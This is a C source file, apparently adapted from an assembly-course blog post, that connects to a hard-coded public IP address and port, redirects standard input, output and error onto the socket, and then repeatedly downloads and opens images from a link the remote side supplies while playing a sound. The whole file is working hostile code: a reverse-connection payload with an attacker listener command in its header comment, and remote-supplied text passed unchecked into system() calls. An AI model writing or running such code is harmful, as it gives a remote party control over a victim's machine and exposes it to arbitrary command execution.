/* Original code taken from https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/
 * Modifications to connect to specific machine
 socat TCP4-LISTEN:15213 STDOUT
*/
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define PORT_NUMBER 15151
#define SERVER_ADDRESS "54.82.172.247"

int main()
{
	int sockfd;
	char buf[4];
	char link[200];
	int result;
	int i = 0;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(PORT_NUMBER);
	inet_aton(SERVER_ADDRESS, &server.sin_addr.s_addr);
	bzero(&server.sin_zero, 8);

	char *const argv[] = {"/usr/bin/sh", NULL};
	char *const envp[] = { NULL };

	//create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	//initiate a connection on a socket, on success 0 is returned
	connect(sockfd, (struct sockaddr *)&server, sizeof(server));
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	int pid = fork();
	if (pid == 0) {
		write(sockfd, "Link: ", 6);
		read(sockfd, &link, 200);

		char *command = (char*)malloc(230 * sizeof(char));

		system("curl --output sound.wav http://thecyberbuddy.com/sounds/Hiccup1.wav");

		while(i < 100){
			sprintf(command, "curl --output pic%d.png %s", i, link);
			system(command);

			sprintf(command, "open pic%d.png", i);
			system(command);

			system("afplay sound.wav");
			i++;
		}
	}
	
	return 0;
}